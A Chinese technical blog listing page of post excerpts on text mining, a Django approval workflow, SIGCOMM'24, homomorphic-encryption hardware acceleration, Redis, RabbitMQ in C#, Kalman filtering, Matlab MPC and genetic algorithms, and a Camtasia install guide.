文本挖掘面临理解语境和文化差异的挑战。同一词语在不同的语境下可能有完全不同的含义，而机器可能难以准确捕捉这种细微差别。文化差异也是一个问题，特别是在处理多语言数据时，不同文化背景下的表达方式和用语习惯可能导致误解。
文本挖掘技术在处理含有讽刺、幽默或双关语等情况时也经常遇到难题。这些文本形式通常需要高度的语境理解和文化知识，目前的技术还无法完全准确地识别和处理这些微妙的语言特点。
隐私和伦理问题也是文本挖掘必须面对的重要议题。在没有适当授权的情况下收集和分析文本数据可能侵犯个人隐私，因此在进行文本挖掘时，必须严格遵守相关的法律法规和伦理标准。
虽然文本挖掘提供了深入分析和理解大量文本数据的可能，但同时也存在着数据质量依赖、语境理解困难、文化差异的挑战以及隐私和伦理上的限制。这些局限性提示使用者在应用文本挖掘技术时需要保持谨慎和批判性思维。
总结 文本挖掘作为连接数据与现实世界的桥梁，展现了其在信息时代的巨大价值。通过对文本挖掘流程的解析，我们不仅理解了它是如何从庞大的文本数据中提取出有价值信息的，还看到了它在不同领域的广泛应用，比如在市场分析、舆情监控甚至是医疗诊断中的应用。当然，也不能忽视文本挖掘面临的挑战，例如数据质量、语境理解的困难、文化差异以及隐私和伦理问题。
展望未来，随着人工智能和自然语言处理技术的进一步发展，文本挖掘的能力将会更加强大，其应用领域也将不断扩展。让我们拭目以待，文本挖掘将如何继续改变我们的世界。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c59d7df48f39538a9b09a39dba4839f/" rel="bookmark">
			【Django-vue-admin学习笔记】审批工作流业务流程动态设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在企业的运营管理中，审批流程的高效执行对于保障业务顺利进行至关重要。一个良好设计的审批系统能够显著提高决策的及时性和准确性，同时促进各部门间的协同工作。
本文将深入探讨如何构建一个既透明又高效的审批流程系统，通过案例分析学校的管理模式，展示如何实现一个清晰、灵活且易于管理的审批流程。本文还将探讨审批系统设计的关键要素，如基础模板配置、审批流程的设计，以及实现审批系统时需要注意的细节。通过这些讨论，目标是为读者提供一个关于如何有效管理和优化审批流程的全面视角。
文章目录 业务场景设计方式基础模板配置（通用）审批流程（业务） 实现方式注意总结 业务场景 一个企业的正常运作离不开审批工作，而这项工作往往需要各个部门的协同完成。因此，在审批业务中，需要实现全方面的协调和高效沟通。这不仅涉及到审批流程的透明度和可追踪性，也包括确保流程的灵活性以适应不同部门的特定需求。为了提高效率，审批系统应集成清晰的指导原则和标准操作流程，同时还需具备强大的数据支持和分析功能，以便实时监控审批进度，确保决策的及时性和准确性。此外考虑到各部门之间的相互依赖性，审批系统还应支持跨部门协作，确保信息的流畅传递和快速响应。通过这些措施，可以有效提升企业的运营效率，加强部门间的协同作用，从而推动整个企业的稳健发展。
这里以学校的管理模式举例一个简单审批流程。对所有业务管理一目了然。
设计方式 模块分类模块应用基础模板配置（通用）审批模板，审批模板流程，审批日期以及用户流水单审批流程（业务）印章申请、学生退学、开具证明、离职申请、物品领用、采购审批、用车申请、损坏赔偿、报销/请款流程 等等 这里设计的理念是通用配置+搭配个性配置应用，实现完整的业务流程。由于学校的管理流程审批比较简单因此这里这么设计比较合理。
审批的工作方式分为创建基础流程配置与流程审批。
基础模板配置（通用） 基础流程配置需要创建审批模板以及对应模板的流程。
这里需要配置4个地方审批的名称，模板的id，能够使用的部门即发起部门，能够审批的部门。这里可能会有疑问每个流程权限控制怎么处理？这里先卖个关子，这样配置后后面其实就不用考虑这些乱七八糟的问题了。
点击每个模板的对应的审批模板可以配置该流程的顺序，这里例学生退学举例，这里分别配置的默认的配置部门顺序，这里对应的审批部门需要进行自定义配置，这里作用是在每次创建用户审批流水单的时候自动根据模板创建审批流程。
这里审批模板流程可以使用前后端不同方式控制，我这里做了2套一个是前端验证一个是后端验证，目的是保证审批顺序不能重复，不能有跳的数字等等
后端验证操作比较麻烦，因此介绍一下前端配置的部分这里比较好理解。每次新增都会默认自增顺序，以及锁定模板名称和ID，这里只需要在下拉选择对应顺序的部门即可。删除流程只能从后往前逐一删除，避免了误操作的情况。如果想删除中间某个流程必须这么操作。
以上配置会跟随着所有流程操作。
并且在后端业务验证中需要进行判断如果流程没有完整的审核的话，即最少一个提交一个审核，那么需要进行提示操作。
审批流程（业务） 这里配置的业务用户创建的审核内容是每个审核流程都需要展示的，因此和之前基础的表单配置一致。
但是这里的内容不用再这里显示给用户查看，揉入到每个新建流程中合并嵌套表单进行添加操作即可。
这样设计为了后面嵌套直接匹配对应的模板就可以了，操作起来更加简单方便。
在新建审批内容之后会看到第一行数据为提交该申请的部门，后面为审批顺序自动同步过来的流程数据。
并且再新建完审批内容之后，每个参与审批的人直接点击审批操作都可以看到提交的内容信息。
对应审批页面会看到每个流程的状态。这里会看到流程结束，审批通过和审批驳回3个特殊状态。
这3个状态的逻辑是审批流程都完事即所有部门审批通过之后即审批通过并且标记流程结束。
如果其中一个流程中被驳回会标记驳回并自动标记流程结束。
在每个数据更新的环节需要有流程消息通知的环节。
这里最重要的还是实现一个流程消息提醒功能。根据配置好的通知部门，不管在新建流程，还是审批环节都是要在消息中心创建对应的内容来提醒用户。
这里是消息提醒的模块。
实现方式注意 需要对创建角色添加审批权限，在dvadmin/system/models.py中的class Role(CoreModel)添加字段控制是否有权限审核，默认为否。
class Role(CoreModel): ...... audit_permissions = models.BooleanField(default=False, verbose_name="审批审核权", help_text="审批审核权") ...... 然后需要在前端的角色管理编辑界面将添加的这个字段调出来可以操作即可。
还需要再API接口的用户接口部分将该字段显示出来，需要修改dvadmin/system/view/user.py搜索result['role_info'] = role.values('id', 'name', 'key')添加权限表示字段即可。
class UserViewSet(CustomModelViewSet): .... def user_info(self, request): """获取当前用户信息""" ...... if role: result['role_info'] = role.values('id', 'name', 'key', 'audit_permissions') ...... 这样设计比重新起一个对照表单接口要简单的多，不过要基于对框架比较熟悉的基础之上操作，否则可能项目都跑不起来了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c59d7df48f39538a9b09a39dba4839f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31809cd304eceb1369f10d01be2f4a04/" rel="bookmark">
			截稿倒计时 | 【CCF-A类】ACM SIGCOMM‘24！2月2日截稿，谁与争锋！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		会议之眼 快讯
第38届SIGCOMM (Special Interest Group on Data Communication)是ACM组织在通信网络领域的旗舰型会议，也是国际通信网络领域的顶尖会议，由ACM SIGCOMM组织举办，该会议将于 2024 年 8月4日至8日在澳大利亚悉尼隆重举行！ ACM（Association for Computing Machine）为美国计算机协会，ACM 有下属37个专业组织SIGs(Special Interest Group)，SIGCOMM即为其中之一。 SIGCOMM是计算机网络领域的国际三大顶尖会议之一，其他两个分别为ACM MOBICOM和IEEE INFOCOM。会议论文的提交截止日期为 2024 年 2 月 2日。距离截稿日期仅剩短短 8天，小编相信科研者们正处于紧张而激情澎湃的最后冲刺阶段！一起共同发扬创新精神，为学术界做出重要贡献！
会议快讯
SIGCOMM是中国计算机学会（CCF）评定为A类的会议，是一个备受关注和不可忽视的论文投稿平台。SIGCOMM是计算机网络领域的顶级学术会议之一，以其对论文质量和数量的极高要求而著称。SIGCOMM要求论文具有基础性贡献、领导性影响和坚实系统背景，并每年只录用30篇左右的正式会议论文，录取率仅约为10%！近两年有所上涨，大约在50篇左右。会议采用Double-Blind审稿和Single-Track演讲，前者保证了审稿质量，后者则保证了每篇论文的演讲都能被所有参会者听到。
在SIGCOMM上发表论文是每个通信网络研究者的终极梦想，因为几乎所有被SIGCOMM录用的论文都会被广泛引用，产生非常大的影响力。这些论文的作者因此成为业内的佼佼者，享有崇高的声誉和无上的荣誉。如果你是一名研究计算机网络的科学家，那么在SIGCOMM上发表论文将是你事业中最重要、最具挑战性和最值得期待的成就之一！
Call for Papers
提交应采用两列10点格式，长度可达12页，以及参考和可选附录所需的额外页面。
提交材料和最终论文可能包括附录（参考文献，不计入12页）。审阅者不需要阅读附录或在审查中考虑它们。因此，作者应确保核心论文完整且自成一体。例如，如果附录提供了证明或实验的细节，正文应该总结关键结果。附录还可能包括非传统材料，如视频、数据集和代码，均经过适当匿名化。
审查过程可能涉及多轮审查。未选择继续进行的论文可能会收到早期通知，包括评论。
被接受的论文可以由项目委员会成员指导，以确保审查员的反馈得到适当处理。审查员还将审查附录，必须批准其必要性。
今年新规定：
对于 SIGCOMM 来说，评审和提交过程的透明度和可视性越来越重要。效仿以往 SIGCOMM 附属会议（如 IMC 2011-2013）的做法，计划发布对已录用论文以及已提交论文版本的匿名和净化审稿。这一尝试将提高论文筛选过程的透明度，帮助初级会员了解论文提交和评审过程，从而使社区受益。
请注意：(1) 这不会影响到最终决定接受或拒绝论文之前的流程；(2) 只对已接受论文的作者产生影响。被录用论文的作者可以选择不参加这一安排，但强烈鼓励作者支持 SIGCOMM 试图使审核过程更加透明。
Important Dates
Chairs
会议信息查询
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4347a326530505585dc664a002148140/" rel="bookmark">
			全同态加密的硬件加速：让机器学习更懂隐私保护
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PrimiHub一款由密码学专家团队打造的开源隐私计算平台，专注于分享数据安全、密码学、联邦学习、同态加密等隐私计算领域的技术和内容。
问题：保护敏感数据 企业机构间合作处理数据越来越频繁，通常使用云服务为数据共享保驾护航。保护数据隐私至关重要，特别是在处理个人可识别信息（PII）、个人健康信息（PHI）、知识产权和情报洞察等敏感数据时。数据有三种基本状态：静态、传输和使用。通常情况下，敏感数据在存储（静态）和共享（传输）时都会进行加密或其他保护。然而，当数据以任何方式进行处理（使用）时，必须首先解密，这使其容易受到网络攻击。
全同态加密 全同态加密（Fully Homomorphic Encryption，FHE）常被描述为加密技术的“圣杯”，它允许在不解密的情况下对加密数据进行任意计算，潜在地解决了数据在使用中的问题。
FHE用于机器学习 FHE最有前景的应用领域之一是机器学习（ML）。近年来，ML发展迅速，应用数量不断增加，包括医学、金融、自然语言处理等领域。ML通常需要多方合作，而为了处理和分析数据（前面提到的使用状态），需要解密数据，这会导致安全漏洞。考虑到数据通常是敏感的，使用FHE进行ML是一种有效的隐私保护解决方案。
FHE用于ML的挑战 当使用FHE进行像ML训练所需的密集计算时，会出现功能性挑战，需要额外的复杂操作，比如引导（允许对数据进行大规模的加密计算链）。FHE与引导解决了许多功能性挑战，但需要大量的计算能力和时间。例如，在标准笔记本电脑上，未加密的计算可能需要数百毫秒完成，但在高端服务器上使用FHE运行可能需要数小时。
解决方案：硬件加速 使FHE中的引导变得实用的最有前途的努力集中在通过硬件平台进行加速上。FHE工作负载表现出高度的任务和数据并行性，可以通过并行处理器利用。低成本但计算效率高且高度优化的硬件协处理器是加速核心FHE操作执行的理想平台。
图中显示了使用不同硬件后端实现的FHE的硬件加速所取得和预期的加速效果，包括FPGA、GPU和ASIC等。目标加速度是认为对于通用计算是实际可行的。
使用不同硬件后端进行FHE的硬件加速所实现和预期的加速效果。多核CPU和GPU的结果来源于[APAV+19]，CPU-AVX-512的结果来源于[BKSD+21]，FPGA的结果来源于[CRS16]。ASIC的结果是根据正在进行的研究的初步结果进行预测的。
硬件加速面临着几个重大挑战，包括计算和内存瓶颈。解决这些问题对于使用FHE实现隐私保护的ML具有变革性潜力。
加密软件框架：OpenFHE库 硬件加速需要在通用CPU上可靠地实现目标功能的软件。一个杰出的FHE软件库是OpenFHE。OpenFHE库是一个社区驱动的开源项目，拥有来自工业界和学术界的多样化贡献者，包括Duality、三星、英特尔、麻省理工学院、加州大学圣地亚哥分校等。它具有更简单的API、模块化、跨平台支持和硬件加速器的集成，对于组织，包括提供先进硬件功能的提供商，都是一个资源。提供商无需成为专家，因为OpenFHE简化了用户访问许多复杂的加密功能。
硬件抽象层 在当前的FHE库中，OpenFHE提供了一个标准的硬件抽象层（HAL），旨在支持不同的硬件加速技术，如高级矢量扩展（AVX）、图形处理单元（GPU）、可编程门阵列（FPGA）和专用集成电路（ASIC）。英特尔HEXL库后端是OpenFHE中HAL实例化的一个示例。
硬件加速提供商的机会 具有前瞻性的先进硬件功能提供商越来越多地探索加速FHE的机会。鉴于硬件加速具有使FHE在各种应用中实际可行的潜力，这一市场趋势有望增长。这些提供商可以参考OpenFHE作为支持其后端的库。
原文地址：Hardware Acceleration of Fully Homomorphic Encryption: Making Privacy-Preserving Machine Learning Practical
原文作者：Ahmad Al Badawi, David Bruce Cousins, Yuriy Polyakov, and Kurt Rohloff
翻译 &amp; 整理：开放隐私计算 &amp; PrimiHub
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21301ad8584ccf96a5bed239ac6b2468/" rel="bookmark">
			高压灭火泵：森林消防的未来科技解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在面对森林火灾的挑战时，我们已经找到了新的解决方案——高压灭火泵。这款由恒峰智慧科技研发的高压灭火泵HFM-B85L以其卓越性能和高效能，正在逐步改变我们的森林消防策略。
输送距离远、扬程高：输送距离可达8-15公里以上，无论面对多么遥远的火源，都能迅速将水送达。
进水滤头水质过滤：即使在泥沙杂质混杂的水源中，也能正常运行，为消防工作提供了可靠的保障。
自吸能力强：垂直高度可达7米，空载运行更安全，大大提高了使用的便捷性。
适应多种气候：无论是高温还是高寒地区，都能稳定可靠地工作。
高效能：在输送距离10-20公里，扬程500-800米的情况下，效率仍能达到百分之九十以上，为灭火争取了宝贵的时间。
使用寿命长、经济效益显著：机械部分不与水直接接触，利用柱塞推动加压达到吸排水的功能，大大延长了水泵的使用寿命。
节水效果显著：适应各种大小消防车的水箱容积，既节省水资源，又满足了灭火的需要。
定制化的配件：特别定制的高压消防水带和森林消防接口，能够在500-800米的垂直高度保证正常使用，进一步提升了设备的效能。
总的来说，高压灭火泵HFM-B85L以其超凡的性能和高效的应用价值，正在成为森林消防的新选择。它不仅能够快速、有效地进行灭火，而且还能适应各种复杂的环境条件，真正实现了科技与实践的完美结合。让我们期待这款设备在未来的森林消防工作中发挥更大的作用！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/668cb653b2cc5a7284d13ad73fa47083/" rel="bookmark">
			Redis系列-数据结构篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构 string（字符串） redis的字符串是动态字符串，类似于ArrayList，采用预分配冗余空间的方式减少内存的频繁分配。
struct SDS&lt;T&gt;{ T capacity; T len; byte flags; byte[] content; } 当字符串比较短时，T可以是byte和short来表示（能省点空间），一个简单的SDS至少占用3字节
struct SDS&lt;T&gt;{ int8 capacity; int8 len; int8 flags; byte[] content; } embstr和raw 当字符串比较短时，存储形式embstr；当字符串比较长时，存储形式raw。
暂时无法在文档外展示此内容
struct RedisObject { int4 type; //4bits int4 encoding; //4bits int24 lru; //24bits，对象的热度 int32 refcount; //32bits，记录对象的引用计数，当lru为0时，对象会被销毁 void *ptr; //64bits } 每个对象除了内容以外，RedisObject本身也占用1/2+1/2+3+4+8 = 16字节
如图所示，embstr存储时会把数据结构redisObject和数据SDS挨边存储；raw存储时数据结构RedisObject和SDS时分开存储，通过ptr指针指向SDS的内存地址。
所以一个简单的字符串最少占用3字节+16字节= 19字节
而redis使用的内存分配器jemalloc，tcmalloc分配内存时的单位都是1/4/8/16/32/64，所以假设内存分配给分配了64字节的空间，那么最多给字符串内容的空间只有44字节 = 64 - 3 - 16 - 1（最后一个1是因为字符串需要以null结尾，占一个子节）
扩容 预分配空间大小：capacity
实际字符串长度：len
创建字符串时，len和capacity是一样的长度
当字符串长度小于1M时，扩容都是加倍现有的空间，即
if(len&lt;1024*1024 &amp;&amp; len+appendLen&gt;=capacity){ capacity = 2*capacity; } 当字符串长度大于1M时，每次扩容比当前多1M空间
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/668cb653b2cc5a7284d13ad73fa47083/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31f4329d446d87b12315efc77d0753bf/" rel="bookmark">
			C#使用RabbitMQ-2_详解工作队列模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 🍀RabbitMQ中的工作队列模式是指将任务分配给多个消费者并行处理。在工作队列模式中，生产者将任务发送到RabbitMQ交换器，然后交换器将任务路由到一个或多个队列。消费者从队列中获取任务并进行处理。处理完成后，消费者可以向RabbitMQ发送一个确认消息，表示任务已完成。
优点：
🍀工作队列模式的主要优点是能够实现负载均衡和并行处理。通过将任务分配给多个消费者，可以提高系统的处理能力和吞吐量。此外，工作队列模式还具有很好的扩展性，可以根据需要动态添加或删除消费者。
任务流程：
生产者（Producer）将任务发送到RabbitMQ交换器（Exchange）。交换器根据路由键（Routing Key）将任务路由到一个或多个队列（Queue）。消费者（Consumer）从队列中获取任务并进行处理。处理完成后，消费者向RabbitMQ发送一个确认消息，表示任务已完成。 生产者代码 在这个代码中我们声明消息队列时第二个参数设置为true，表示这个队列是持久化的。接着使用while做一个循环，不断读取用户输入的消息内容，然后将其转换为字节数组后发布到"hello"队列中。
class MyClass { public static void Main(string[] args) { var factory = new ConnectionFactory(); factory.HostName = "localhost"; //RabbitMQ服务在本地运行 factory.UserName = "guest"; //用户名 factory.Password = "guest"; //密码 //创建连接 using (var connection = factory.CreateConnection()) { //创建通道 using (var channel = connection.CreateModel()) { //声明一个名称为hello的消息队列 channel.QueueDeclare("hello", true, false, false, null); string msg = null; int i = 1; Console.WriteLine("请输入要发送的消息内容："); while (!string.IsNullOrEmpty(msg = Console.ReadLine())) { string message = $"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31f4329d446d87b12315efc77d0753bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e778da51c38db1912017fd01954b649/" rel="bookmark">
			C#使用RabbitMQ-1_Docker部署并在c#中实现简单模式消息代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 RabbitMQ是一个开源的消息队列系统，实现了高级消息队列协议（AMQP）。
🍀RabbitMQ起源于金融系统，现在广泛应用于各种分布式系统中。它的主要功能是在应用程序之间提供异步消息传递，实现系统间的解耦和消息的可靠传递。RabbitMQ使用Erlang语言开发，支持多种客户端语言如Python、Ruby、.NET、Java等。
此外，RabbitMQ具有以下特点：
易用性：提供了简单易用的API，使得生产者和消费者可以方便地发送和接收消息。扩展性：可以水平扩展以处理大量的消息，支持集群部署来提高系统的吞吐量和可用性。高可用性：通过镜像队列等机制保证消息不会因服务器故障而丢失，确保了系统的稳健运行。多种交换模式：支持直接交换、扇形交换、主题交换和头交换等多种交换模式，满足不同的消息路由需求。多协议支持：除了AMQP协议，还支持STOMP等其他消息协议。 在docker中部署RabbitMQ 🍀首先在dockerHub中找到RabbitMQ的镜像
rabbitmq - 官方图片 (docker.com)
🍀执行命令拉取镜像
docker pull rabbitmq 🍀镜像拉取完成之后启动镜像
docker run -d -p 5672:5672 -p 15672:15672 --name rabbitmq rabbitmq 🍀此时我们打开 http://localhost:15672/会发现无法访问，这是因为管理插件还未被激活
🍀通过docker ps -a查看部署的RabbitMQ容器id，在通过使用命令
docker exec -it 容器id /bin/bash 🍀进入容器内部再运行：rabbitmq-plugins enable rabbitmq_management
🍀此时就可以打开管理插件了，第一次使用 RabbitMQ 管理界面，需要使用默认的用户名和密码（ guest/guest）来登录
消息队列简单模式（直连交换机） 🍀simple模式，是RabbitMQ最简单的一种模式，如下图所示，只有一个生产者，一个消费者和一个队列
🍀生产者和消费者在发送和接受消息时，只需要指定队列名，而不需要指定发送到哪个Exchange
生产者代码 class MyClass { public static void Main(string[] args) { var factory = new ConnectionFactory(); factory.HostName = "localhost"; //RabbitMQ服务在本地运行 factory.UserName = "guest"; //用户名 factory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e778da51c38db1912017fd01954b649/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c36961933e6f9ef290e4561edeb8cfa7/" rel="bookmark">
			深入了解卡尔曼滤波：最优状态估计的数学神器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 点击上方“小白学视觉”，选择加"星标"或“置顶” 重磅干货，第一时间送达 卡尔曼滤波是一种递归的状态估计方法，它通过系统模型和测量值来更新状态的最优估计。我们先来了解一下卡尔曼滤波的基本原理。
1. 假设条件
卡尔曼滤波的基本假设如下：
线性动态模型：系统的状态转移和观测模型是线性的。即
其中x表示状态向量，z表示观测向量，F、H是状态转移矩阵和观测矩阵，B是控制矩阵，u是控制向量，w和v是系统和观测噪声。
高斯分布噪声：系统噪声和观测噪声都是高斯分布的，并且彼此之间相互独立。
2. 卡尔曼滤波的步骤
卡尔曼滤波主要分为两个步骤：预测和更新。
(1) 预测步骤：
在预测步骤中，我们利用系统的状态转移方程来预测下一个时刻的状态和协方差矩阵。具体的计算公式如下：
预测状态估计：
预测误差协方差：
(2) 更新步骤：
在更新步骤中，我们将系统的测量值与预测的状态进行比较，从而校正状态估计值和协方差矩阵。具体的计算公式如下：
1. 预测观测值：
2. 预测观测误差： 3. 卡尔曼增益：
4. 更新状态估计：
5. 更新误差协方差：
这些公式是卡尔曼滤波中关键的计算步骤，通过它们可以将预测的状态估计与实际观测值结合起来，从而更新并优化状态的估计值。
卡尔曼滤波的应用领域和扩展版本
卡尔曼滤波常见应用：
1. 航空航天与导航定位：在航空航天领域，卡尔曼滤波在导航定位系统中起着至关重要的作用。它可以利用传感器的测量信息，如GPS、陀螺仪、加速度计等，提供准确的位置和姿态估计。
通过对机体状态的优化估计，可以处理传感器的测量误差、不确定性和噪声。
2. 自动驾驶和机器人技术：在自动驾驶车辆和机器人技术中，卡尔曼滤波被用于实时的环境感知与动态路径规划。
通过结合传感器数据，如激光雷达、摄像头和惯性测量单元（IMU），可以对目标位置、速度和方向进行估计，并实现高精度的导航和运动控制。
3. 金融领域：卡尔曼滤波在金融领域中也有广泛应用。例如，用于股票价格和市场波动的预测，可以基于历史数据和实时市场数据进行状态估计和预测。
此外，卡尔曼滤波还用于对金融市场中的投资组合进行优化调整和风险管理。
4. 信号处理与图像处理：在信号处理和图像处理领域中，卡尔曼滤波用于估计实时信号和图像的状态。例如，语音识别中的语音信号预测，以及图像跟踪中目标位置的估计等。
通过利用卡尔曼滤波的状态估计优化能力，可以提高信号处理和图像处理算法的稳定性和准确性。
扩展版本用于处理非线性系统和非高斯噪声的情况：
1. 扩展卡尔曼滤波（Extended Kalman Filter）：用于非线性系统的状态估计。它通过对状态转移和观测模型进行线性化，将非线性问题转化为线性问题来求解。
2. 无迹卡尔曼滤波（Unscented Kalman Filter）：也适用于非线性系统，但不需要进行显式的线性化。它通过一组特殊选择的样本点，通过非线性变换来近似状态转移和观测模型。这样可以克服线性化所带来的误差。
版权声明：本文为CSDN博主「嵌入式小白—小黑」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/Goforyouqp/article/details/131616229
下载1：OpenCV-Contrib扩展模块中文版教程 在「小白学视觉」公众号后台回复：扩展模块中文教程，即可下载全网第一份OpenCV扩展模块教程中文版，涵盖扩展模块安装、SFM算法、立体视觉、目标跟踪、生物视觉、超分辨率处理等二十多章内容。 下载2：Python视觉实战项目52讲 在「小白学视觉」公众号后台回复：Python视觉实战项目，即可下载包括图像分割、口罩检测、车道线检测、车辆计数、添加眼线、车牌识别、字符识别、情绪检测、文本内容提取、面部识别等31个视觉实战项目，助力快速学校计算机视觉。 下载3：OpenCV实战项目20讲 在「小白学视觉」公众号后台回复：OpenCV实战项目20讲，即可下载含有20个基于OpenCV实现20个实战项目，实现OpenCV学习进阶。 交流群 欢迎加入公众号读者群一起和同行交流，目前有SLAM、三维视觉、传感器、自动驾驶、计算摄影、检测、分割、识别、医学影像、GAN、算法竞赛等微信群（以后会逐渐细分），请扫描下面微信号加群，备注：”昵称+学校/公司+研究方向“，例如：”张三 + 上海交大 + 视觉SLAM“。请按照格式备注，否则不予通过。添加成功后会根据研究方向邀请进入相关微信群。请勿在群内发送广告，否则会请出群，谢谢理解~ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69fabbf0b4a98cf4ba63c36bd1e14d51/" rel="bookmark">
			【MPC控制】基于线性MPC实现低曲率道路车道保持和避障附Matlab代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：热爱科研的Matlab仿真开发者，修心和技术同步精进，
代码获取、论文复现及科研仿真合作可私信。 🍎个人主页：Matlab科研工作室
🍊个人信条：格物致知。
更多Matlab完整代码及仿真定制内容点击👇
智能优化算法 神经网络预测 雷达通信 无线传感器 电力系统
信号处理 图像处理 路径规划 元胞自动机 无人机
🔥 内容介绍 1. 概述 近年来，随着自动驾驶技术的发展，对车辆控制系统的要求也越来越高。模型预测控制（MPC）是一种先进的控制方法，它可以预测系统未来的状态，并根据预测结果来计算控制输入，从而使系统达到最佳的控制效果。MPC控制在自动驾驶领域有着广泛的应用，例如车道保持、避障、轨迹跟踪等。
2. 线性MPC控制 线性MPC控制是一种基于线性模型的MPC控制方法。它假设系统是一个线性时不变系统，并使用线性模型来预测系统未来的状态。线性MPC控制的优点是计算量小，易于实现。
3. 基于线性MPC实现低曲率道路车道保持和避障 在低曲率道路上，车辆的行驶状态可以近似为线性。因此，可以使用线性MPC控制来实现车道保持和避障。
3.1 车道保持 车道保持是指车辆在低曲率道路上保持在车道中心行驶。可以使用线性MPC控制来实现车道保持。具体步骤如下：
建立车辆的线性模型。
定义车道保持的控制目标。
设计线性MPC控制器。
将线性MPC控制器应用于车辆控制系统。
3.2 避障 避障是指车辆在低曲率道路上避开障碍物行驶。可以使用线性MPC控制来实现避障。具体步骤如下：
建立车辆和障碍物的线性模型。
定义避障的控制目标。
设计线性MPC控制器。
将线性MPC控制器应用于车辆控制系统。
📣 部分代码 function [f_x_TV, v_x_TV, TV_x] = CreateObstacle(Obstacles, T_sampling) f_x_TV = []; v_x_TV = []; TV_x = cell(size(Obstacles)); for obs = 1:length(Obstacles) obstacle = Obstacles(obs); if mean(obstacle.width) &lt; 0 f_x_TV = [f_x_TV;0 0 0 -1 0]; % e_y v_x_TV = [v_x_TV;-max(obstacle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69fabbf0b4a98cf4ba63c36bd1e14d51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c68c5e02e08fe45a93061a9e6129e540/" rel="bookmark">
			【优化分配】基于遗传算法求解搜索区域分配优化问题附Matlab代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：热爱科研的Matlab仿真开发者，修心和技术同步精进，
代码获取、论文复现及科研仿真合作可私信。 🍎个人主页：Matlab科研工作室
🍊个人信条：格物致知。
更多Matlab完整代码及仿真定制内容点击👇
智能优化算法 神经网络预测 雷达通信 无线传感器 电力系统
信号处理 图像处理 路径规划 元胞自动机 无人机
🔥 内容介绍 摘要 搜索区域分配优化问题是将搜索区域分配给多个搜索者，以最大化搜索效率的问题。该问题在许多领域都有应用，例如搜索救援、矿产勘探、环境监测等。
遗传算法是一种常用的优化算法，它以生物进化为灵感，通过模拟自然选择和遗传变异的过程，来寻找最优解。遗传算法具有鲁棒性强、全局搜索能力强等优点，因此非常适合求解搜索区域分配优化问题。
问题描述 搜索区域分配优化问题可以描述如下：
给定一个搜索区域，将其划分为 �n 个子区域，并将其分配给 �m 个搜索者。每个搜索者的搜索效率与所分配的子区域有关。目标是找到一种分配方案，使得搜索效率最大化。
遗传算法求解 遗传算法求解搜索区域分配优化问题的步骤如下：
初始化种群。 种群由一组随机生成的染色体组成，每个染色体代表一种分配方案。
计算种群的适应度。 适应度函数根据每个染色体的搜索效率来计算。
选择。 根据适应度，选择种群中最好的染色体进行繁殖。
交叉。 将两个选定的染色体进行交叉，生成新的染色体。
变异。 对新的染色体进行变异，以增加种群的多样性。
重复步骤2-5，直到达到终止条件。 终止条件可以是达到最大迭代次数、适应度达到某个阈值等。
📣 部分代码 clcclearplane=[2 16 610 1; %plane performance matrix 飞机性能 2 21 815 1; 2 15 540 1 2 9 750 1];xp=-1000; yp=-1000; %air port location 机场位置x0=0; y0=0; %search boundery 搜索边界x1=1000; y1=500;dx=20; dy=-20; %ocean current 洋流p=2; %the density of grid(km per grid) 网格密度Q=100; %quantity of populationgen=240; %genetic algebra 遗传代数mode=1; %概率平均分布模式 width=50; %the width of scan areaM=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c68c5e02e08fe45a93061a9e6129e540/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b32a51cee7a3b6b8af2cb1fcd09f378/" rel="bookmark">
			camtasia喀秋莎2024视频剪辑软件的下载安装步骤教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1-本次讲解camtasia 喀秋莎视频剪辑软件的安装步骤。
2-打开下载好的安装程序，选择中文，然后点击确定。
Camtasia2024win-安装包下载如下:
https://wm.makeding.com/iclk/?zoneid=56867
Camtasia2024mac-安装包下载如下:
